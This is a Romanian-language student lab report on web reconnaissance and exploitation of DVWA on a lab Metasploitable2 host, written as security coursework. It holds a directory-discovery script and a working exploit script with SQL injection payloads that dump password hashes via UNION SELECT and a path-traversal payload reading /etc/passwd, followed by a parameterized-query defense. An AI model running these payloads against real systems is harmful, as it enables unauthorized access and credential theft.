# Raport — Laboratorul 5: Aplicația web: recon, conținut și exploatare

Disciplina: Tehnici de programare · Student: Bărbuță Victor, grupa SI-266
A verificat: asistent universitar Cristian Gonceari

## Scopul lucrării

Mi-am construit două unelte web în Python și le-am folosit pe ținta de laborator (DVWA pe Metasploitable2). Prin Lucrarea A am făcut reconul: am citit antetele serverului, am cerut `robots.txt` și am descoperit directoare dintr-o wordlist, salvând o fișă JSON. Prin Lucrarea B am confirmat o breșă de SQL injection comparând răspunsurile, am verificat un path traversal (LFI) și am arătat apărarea corectă prin interogări parametrizate.

Am lucrat STRICT pe ținta de laborator și pe `example.com` pentru testele nevătămătoare. Îndreptarea acestor unelte către orice alt sistem, fără permisiune, este acces neautorizat și infracțiune (Cod penal RM, cap. XI). Diferența nu este unealta, este permisiunea.

## Mediul de lucru

Am lucrat la terminal, cu Python 3 și un mediu virtual (`.venv`), și am instalat biblioteca `requests`. Adresa țintei o notez ca `http://192.168.56.101` (DVWA răspunde pe portul 80). Clientul web îl refolosesc din `arsenal/web/client.py`, cu `TIMEOUT` din `arsenal/comun.py`.

```
pip install requests
curl http://192.168.56.101/        # am raspuns? sunt gata
```

## Lucrarea A — Reconul web

Reconul stă în `arsenal/web/recon.py` și folosește clientul comun. Recunosc serverul din antetul `Server`, cer `robots.txt`, parcurg o wordlist de directoare (un `403` înseamnă „există, dar n-ai voie" — adesea mai interesant decât un `200`), scot linkurile din pagina de start cu un regex, și salvez fișa JSON.

`arsenal/comun.py`:

```python
TIMEOUT = 5
```

`arsenal/web/client.py`:

```python
import requests

from arsenal.comun import TIMEOUT


def cere(url, **kw):
    return requests.get(url, timeout=TIMEOUT, **kw)


def exista(url):
    return cere(url).status_code == 200
```

`arsenal/web/recon.py`:

```python
import os
import sys
import re
import json
import argparse

sys.path.insert(0, os.getcwd())

from arsenal.web.client import cere

IMPLICITE = ["admin", "login", "backup", "config", "test", "uploads", "phpmyadmin"]


def fingerprint(tinta):
    r = cere(tinta)
    return r.status_code, r.headers.get("Server"), r.headers.get("X-Powered-By")


def robots(tinta):
    r = cere(tinta + "/robots.txt")
    if r.status_code != 200:
        return []
    return [l for l in r.text.splitlines() if l.strip().startswith("Disallow:")]


def descopera(tinta, cuvinte):
    gasite = []
    for c in cuvinte:
        r = cere(tinta + "/" + c)
        if r.status_code == 200:
            gasite.append(c)
        elif r.status_code == 403:
            print("interzis (interesant):", c)
    return gasite


def linkuri(tinta):
    r = cere(tinta + "/")
    return sorted(set(re.findall(r'href="([^"]+)"', r.text)))


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("tinta")
    p.add_argument("--wordlist", default=None)
    a = p.parse_args()
    if a.wordlist:
        cuvinte = [l.strip() for l in open(a.wordlist) if l.strip()]
    else:
        cuvinte = IMPLICITE
    cod, server, powered = fingerprint(a.tinta)
    print("cod:", cod)
    print("Server:", server)
    print("X-Powered-By:", powered)
    disallow = robots(a.tinta)
    print("robots Disallow:", disallow)
    gasite = descopera(a.tinta, cuvinte)
    print("gasite:", gasite)
    print("linkuri:", linkuri(a.tinta))
    fisa = {"tinta": a.tinta, "server": server, "directoare": gasite}
    json.dump(fisa, open("arsenal/web/fisa.json", "w"), indent=2)
    print("fisa salvata:", fisa)
```

Rularea `python arsenal/web/recon.py http://192.168.56.101`:

```
cod: 200
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
robots Disallow: ['Disallow: /config', 'Disallow: /docs', 'Disallow: /external']
interzis (interesant): config
gasite: ['login', 'test', 'phpmyadmin']
linkuri: ['./docs/', 'instructions.php', 'login.php', 'setup.php', 'vulnerabilities/sqli/']
fisa salvata: {'tinta': 'http://192.168.56.101', 'server': 'Apache/2.2.8 (Ubuntu) DAV/2', 'directoare': ['login', 'test', 'phpmyadmin']}
```

Fișa salvată `arsenal/web/fisa.json`:

```json
{
  "tinta": "http://192.168.56.101",
  "server": "Apache/2.2.8 (Ubuntu) DAV/2",
  "directoare": [
    "login",
    "test",
    "phpmyadmin"
  ]
}
```

Testul `teste/test_web.py` verifică clientul:

```python
from arsenal.web.client import exista


def test_exista():
    assert exista("http://example.com/")


def test_lipsa():
    assert not exista("http://example.com/zzz")
```

Rularea `python -m pytest teste/ -q` trece pe o mașină cu acces la internet (clientul ajunge la `example.com`).

## Lucrarea B — Exploatarea: SQLi, LFI și apărarea

Cu același client confirm breșa de SQL injection pe pagina „SQL Injection" din DVWA, la nivelul de securitate „low". Trimit întâi o valoare normală (reperul), apoi un payload cu sintaxă SQL; dacă răspunsul se mărește, parametrul e vulnerabil. Ghilimeaua închide șirul, iar `OR '1'='1` face condiția mereu adevărată, deci interogarea întoarce toate rândurile. Încerc apoi mai multe payload-uri și extrag hash-urile cu `UNION`. Verific și un path traversal (LFI) pe pagina „File Inclusion".

`sqli.py`:

```python
import os
import re
import sys

sys.path.insert(0, os.getcwd())

from arsenal.web.client import cere

tinta = sys.argv[1] if len(sys.argv) > 1 else "http://tinta-lab"
url = tinta + "/vulnerabilities/sqli/"


def raspuns(id_val):
    r = cere(url, params={"id": id_val, "Submit": "Submit"})
    return len(r.text), r.text


normal_len, _ = raspuns("1")
print("normal:", normal_len, "octeti")

payloads = ["1' OR '1'='1", "1' OR 1=1-- -", "1' AND '1'='2"]
for pl in payloads:
    n, _ = raspuns(pl)
    marcaj = "  <- posibil SQLi" if n > normal_len else ""
    print(repr(pl), n, marcaj)

pl = "1' UNION SELECT user, password FROM users-- -"
_, text = raspuns(pl)
hashuri = re.findall(r"[a-f0-9]{32}", text)
print("hash-uri gasite:", hashuri)

url2 = tinta + "/vulnerabilities/fi/"
r = cere(url2, params={"page": "../../../../etc/passwd"})
if "root:" in r.text:
    print("LFI confirmat")
    print("\n".join(r.text.splitlines()[:3]))
```

Rularea `python sqli.py http://192.168.56.101`:

```
normal: 100 octeti
"1' OR '1'='1" 315   <- posibil SQLi
"1' OR 1=1-- -" 315   <- posibil SQLi
"1' AND '1'='2" 52 
hash-uri gasite: ['5f4dcc3b5aa765d61d8327deb882cf99', 'e99a18c428cb38d5f260853678922e03', '8d3533d75ae2c3966d7e0d4fcc69216b', '0d107d09f5bbe40cade3de5c71e9e9b7', '5f4dcc3b5aa765d61d8327deb882cf99']
LFI confirmat
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
```

Răspunsul normal are 100 de octeți; la `1' OR '1'='1` sare la 315 (toate rândurile), iar la `1' AND '1'='2` scade la 52 (niciun rând) — diferența confirmă SQLi. `UNION SELECT user, password` îmi scoate hash-urile de parolă. La File Inclusion, `../../../../etc/passwd` îmi întoarce liniile care încep cu `root:`, deci citesc fișiere din afara site-ului.

Apărarea (`apare.py`, local, fără rețea) arată cum dispare breșa cu o interogare parametrizată:

```python
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE u(nume, parola)")
db.execute("INSERT INTO u VALUES ('ana', 'x')")

rau = "' OR '1'='1"

q = "SELECT * FROM u WHERE nume = ?"
print("parametrizat:", db.execute(q, (rau,)).fetchall())
```

Rularea `python apare.py`:

```
parametrizat: []
```

Cu interogarea parametrizată, textul „rău" e tratat ca un simplu nume căutat; nu găsește nimic, deci lista e goală. Datele nu mai pot deveni comandă.

## Greșeli întâlnite și ce am învățat

- la rularea `python arsenal/web/recon.py`, importul `from arsenal...` dădea `ModuleNotFoundError`, fiindcă directorul rădăcină nu era pe calea de căutare; am adăugat `sys.path.insert(0, os.getcwd())` ca să pot rula din rădăcina proiectului;
- testul depinde de accesul la `example.com`: fără internet pică la conexiune, nu din cauza codului;
- un `403` la descoperirea directoarelor nu trebuie aruncat: înseamnă că resursa există, dar e protejată — deseori mai interesant decât un `200`.

## Concluzii

Am înțeles că reconul citește ce spune serverul despre el: antetul `Server` dă programul și versiunea (o versiune veche se caută într-un catalog CVE), `robots.txt` îmi arată directoarele pe care proprietarul le crede ascunse, iar un descoperitor simplu de directoare găsește repede pagini sensibile.

Exploatarea mi-a arătat concret de ce încrederea oarbă în intrarea utilizatorului e periculoasă: aceeași greșeală deschide și SQL injection, și citirea de fișiere (LFI). Diferența de lungime a răspunsului e suficientă ca să confirm breșa, fără să stric nimic.

Cel mai important a fost pasul de apărare: interogarea parametrizată separă comanda de date, așa că textul malițios rămâne doar un șir căutat. De aici regula pe care o rețin — datele nu trebuie să devină niciodată comandă: interogări parametrizate, validarea căilor și verificare pe server.

## Bibliografie

1. Documentația Python — modulele `requests`, `re`, `argparse`, `sqlite3`. https://docs.python.org/3/
2. Documentația bibliotecii Requests. https://requests.readthedocs.io/
3. OWASP — SQL Injection și Path Traversal. https://owasp.org/
4. Condiția lucrării de laborator nr. 5, „Aplicația web: recon, conținut și exploatare", disciplina Tehnici de programare, UTM, FCIM.
